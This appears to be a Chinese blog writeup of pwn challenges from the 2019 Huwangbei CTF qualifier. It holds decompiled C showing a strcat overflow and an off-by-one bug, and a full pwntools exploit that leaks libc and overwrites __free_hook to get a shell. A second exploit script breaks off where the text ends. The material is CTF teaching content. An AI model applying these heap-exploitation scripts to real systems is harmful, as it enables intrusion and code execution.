<!DOCTYPE html>












  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">












<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">






















<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">


  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">









<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '6.3.0',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta name="description" content="护网杯 pwn writeupmergeheap漏洞利用libc2.27，strcat连接的时候溢出改size造成overlapping，之后tcache dup改chunk的size，拿到unsorted bin泄露地址，最后tcache dup到free_hook即可。 1234567891011121314151617181920212223242526int Merge()&amp;#123;">
<meta property="og:type" content="article">
<meta property="og:title" content="护网杯预选赛pwn部分writeup">
<meta property="og:url" content="http://yoursite.com/2019/12/12/Huwangbei/index.html">
<meta property="og:site_name" content="Ama2in9">
<meta property="og:description" content="护网杯 pwn writeupmergeheap漏洞利用libc2.27，strcat连接的时候溢出改size造成overlapping，之后tcache dup改chunk的size，拿到unsorted bin泄露地址，最后tcache dup到free_hook即可。 1234567891011121314151617181920212223242526int Merge()&amp;#123;">
<meta property="og:locale" content="zh-Hans">
<meta property="og:updated_time" content="2019-12-12T03:48:23.244Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="护网杯预选赛pwn部分writeup">
<meta name="twitter:description" content="护网杯 pwn writeupmergeheap漏洞利用libc2.27，strcat连接的时候溢出改size造成overlapping，之后tcache dup改chunk的size，拿到unsorted bin泄露地址，最后tcache dup到free_hook即可。 1234567891011121314151617181920212223242526int Merge()&amp;#123;">






  <link rel="canonical" href="http://yoursite.com/2019/12/12/Huwangbei/">



<script type="text/javascript" id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>护网杯预选赛pwn部分writeup | Ama2in9</title>
  









  <noscript>
  <style type="text/css">
    .use-motion .motion-element,
    .use-motion .brand,
    .use-motion .menu-item,
    .sidebar-inner,
    .use-motion .post-block,
    .use-motion .pagination,
    .use-motion .comments,
    .use-motion .post-header,
    .use-motion .post-body,
    .use-motion .collection-title { opacity: initial; }

    .use-motion .logo,
    .use-motion .site-title,
    .use-motion .site-subtitle {
      opacity: initial;
      top: initial;
    }

    .use-motion {
      .logo-line-before i { left: initial; }
      .logo-line-after i { right: initial; }
    }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Ama2in9</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Toggle navigation bar">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">
    <a href="/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-about">
    <a href="/about/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-tags">
    <a href="/tags/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-categories">
    <a href="/categories/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">
    <a href="/archives/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
  </li>

      
      
    </ul>
  

  

  
</nav>



  



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
            

          
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/12/Huwangbei/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ama2in9">
      <meta itemprop="description" content="Seeing how far I have been.">
      <meta itemprop="image" content="/images/head.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Ama2in9">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">护网杯预选赛pwn部分writeup
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2019-12-12 11:48:23" itemprop="dateCreated datePublished" datetime="2019-12-12T11:48:23+08:00">2019-12-12</time>
            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/护网杯2019/" itemprop="url" rel="index"><span itemprop="name">护网杯2019</span></a></span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/12/12/Huwangbei/#comments" itemprop="discussionUrl">
                
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/12/12/Huwangbei/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2019/12/12/Huwangbei/" class="leancloud_visitors" data-flag-title="护网杯预选赛pwn部分writeup">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">Views: </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="护网杯-pwn-writeup"><a href="#护网杯-pwn-writeup" class="headerlink" title="护网杯 pwn writeup"></a>护网杯 pwn writeup</h1><h2 id="mergeheap"><a href="#mergeheap" class="headerlink" title="mergeheap"></a>mergeheap</h2><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>libc2.27，strcat连接的时候溢出改size造成overlapping，之后tcache dup改chunk的size，拿到unsorted bin泄露地址，最后tcache dup到free_hook即可。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Merge</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> final_size; <span class="comment">// ST1C_4</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> idx1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> idx2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">14</span> &amp;&amp; qword_2020A0[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i &gt; <span class="number">14</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"full"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"idx1:"</span>);</span><br><span class="line">  idx1 = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( idx1 &lt; <span class="number">0</span> || idx1 &gt; <span class="number">14</span> || !qword_2020A0[idx1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"invalid"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"idx2:"</span>);</span><br><span class="line">  idx2 = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( idx2 &lt; <span class="number">0</span> || idx2 &gt; <span class="number">14</span> || !qword_2020A0[idx2] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"invalid"</span>);</span><br><span class="line">  final_size = dword_202060[idx1] + dword_202060[idx2];</span><br><span class="line">  qword_2020A0[i] = <span class="built_in">malloc</span>(final_size);</span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="keyword">char</span> *)qword_2020A0[i], (<span class="keyword">const</span> <span class="keyword">char</span> *)qword_2020A0[idx1]);</span><br><span class="line">  <span class="built_in">strcat</span>((<span class="keyword">char</span> *)qword_2020A0[i], (<span class="keyword">const</span> <span class="keyword">char</span> *)qword_2020A0[idx2]);<span class="comment">// 漏洞</span></span><br><span class="line">  dword_202060[i] = final_size;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Done"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./mergeheap'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./mergeheap'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line">    p = remote(<span class="string">'49.232.101.194'</span>,<span class="number">54337</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"len:"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"content:"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'idx:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'idx:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Merge</span><span class="params">(idx1,idx2)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'idx1:'</span>)</span><br><span class="line">    p.sendline(str(idx1))</span><br><span class="line">    p.recvuntil(<span class="string">'idx2:'</span>)</span><br><span class="line">    p.sendline(str(idx2))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    Add(<span class="number">0x20</span>,<span class="string">'a'</span>*<span class="number">0x20</span>)<span class="comment">#0</span></span><br><span class="line">    Add(<span class="number">0x28</span>,<span class="string">'a'</span>*<span class="number">0x28</span>)<span class="comment">#1</span></span><br><span class="line">    Add(<span class="number">0xf8</span>,<span class="string">'b'</span>*<span class="number">0xf8</span>)<span class="comment">#2</span></span><br><span class="line">    Add(<span class="number">0x48</span>,<span class="string">'a'</span>*<span class="number">0x48</span>)<span class="comment">#3</span></span><br><span class="line">    Add(<span class="number">0x78</span>,<span class="string">'a'</span>*<span class="number">0x78</span>)<span class="comment">#4</span></span><br><span class="line">    Add(<span class="number">0x78</span>,<span class="string">'a'</span>*<span class="number">0x78</span>)<span class="comment">#5</span></span><br><span class="line">    Add(<span class="number">0x78</span>,<span class="string">'a'</span>*<span class="number">0x78</span>)<span class="comment">#6</span></span><br><span class="line">    Add(<span class="number">0x3f8</span>,<span class="string">'a\n'</span>)<span class="comment">#7</span></span><br><span class="line">    Add(<span class="number">0x78</span>,<span class="string">'a'</span>*<span class="number">0x78</span>)<span class="comment">#8</span></span><br><span class="line">    Delete(<span class="number">3</span>)</span><br><span class="line">    Merge(<span class="number">0</span>,<span class="number">1</span>)<span class="comment">#3</span></span><br><span class="line">    Delete(<span class="number">4</span>)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Add(<span class="number">0xf8</span>,<span class="string">'b'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x501</span>)+<span class="string">'\n'</span>)<span class="comment"># freed 5 &amp; 6 &amp; 7</span></span><br><span class="line">    Delete(<span class="number">5</span>)</span><br><span class="line">    Add(<span class="number">0x78</span>,<span class="string">'a\n'</span>)<span class="comment">#5</span></span><br><span class="line">    Show(<span class="number">6</span>)</span><br><span class="line">    libc_base = u64(p.recvline().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - (<span class="number">0x7ffff7dcfca0</span> - <span class="number">0x7ffff79e4000</span>)</span><br><span class="line">    log.success(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    Delete(<span class="number">7</span>)</span><br><span class="line">    Add(<span class="number">0xf8</span>,<span class="string">'c'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x401</span>)+p64(free_hook)+<span class="string">'\n'</span>)<span class="comment">#7</span></span><br><span class="line">    Add(<span class="number">0x3f8</span>,<span class="string">'/bin/sh\x00\n'</span>)<span class="comment">#8</span></span><br><span class="line">    Add(<span class="number">0x3f8</span>,p64(libc_base+libc.symbols[<span class="string">'system'</span>])+<span class="string">'\n'</span>)<span class="comment">#9</span></span><br><span class="line">    Delete(<span class="number">9</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="flower"><a href="#flower" class="headerlink" title="flower"></a>flower</h2><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>只能Add<code>0x58</code>及以下的chunk，Add的时候不会检查index位置是否为空可以直接覆写，input有off-by-one，但只有0x58的可以。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">Add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> idx; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *chunk_addr; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Name of Size : "</span>);</span><br><span class="line">  size = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0</span> &amp;&amp; size &lt;= <span class="number">0x58</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"input index: "</span>);</span><br><span class="line">    idx = read_int();</span><br><span class="line">    <span class="keyword">if</span> ( idx &gt;= <span class="number">0</span> &amp;&amp; idx &lt;= <span class="number">5</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      chunk_addr = <span class="built_in">malloc</span>(size);</span><br><span class="line">      <span class="keyword">if</span> ( !chunk_addr )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"malloc error"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      dword_2020A8[<span class="number">4</span> * idx] = size;</span><br><span class="line">      *((_QWORD *)&amp;unk_2020A0 + <span class="number">2</span> * idx) = chunk_addr;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"input flower name:"</span>);</span><br><span class="line">      get_input(*((_BYTE **)&amp;unk_2020A0 + <span class="number">2</span> * idx), size);</span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"error"</span>);</span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"error"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">get_input</span><span class="params">(_BYTE *a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  v3 = (<span class="keyword">signed</span> <span class="keyword">int</span>)read(<span class="number">0</span>, a1, a2);</span><br><span class="line">  <span class="keyword">if</span> ( v3 == <span class="number">0x58</span> )</span><br><span class="line">    a1[<span class="number">0x58</span>] = <span class="number">0</span>;                               <span class="comment">// off-by-one</span></span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里输入choice时使用scanf，因为scanf是用malloc分配的缓冲区，在输入数据量大的时候会进行chunk的合并操作，合并之后的chunk会被放入smallbin，分配的时候会先看smallbin，不合适用top_chunk分配。</p>
<p>泄露libc:释放几个chunk，scanf输入大量数据最后merge得到unsorted bin，分配一个chunk用Show即可泄露Libc。</p>
<p>get shell：开始先用chunk shrink，改了size之后发现smallbin报的size error，之后以为这个构造有问题，于是改成了chunk extend，结果merge的时候好像不会合并或者出问题（总之是自己操作不太行）。最后还是改回chunk shrink，构造后面的fake_prev_size和fake_size，最后构造拿到Overlap chunk制造double free，地址开随机化的话heap前一个字节为0x55或0x56，0x56对应fastbin[0x50]，free一个0x28的块，在main_arena里malloc到这个块0x56打头为size的块，修改main_arena的top_chunk到malloc_hook附近的块，这里选的是0x25，malloc到这个块修改realloc_hook为one_gadget，malloc_hook为realloc+x，偏移和gadget自己调整一下，最后拿shell。</p>
<h3 id="exp-py-1"><a href="#exp-py-1" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./pwn'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'49.232.101.194'</span>,<span class="number">54337</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(size,index,name)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Size : "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span 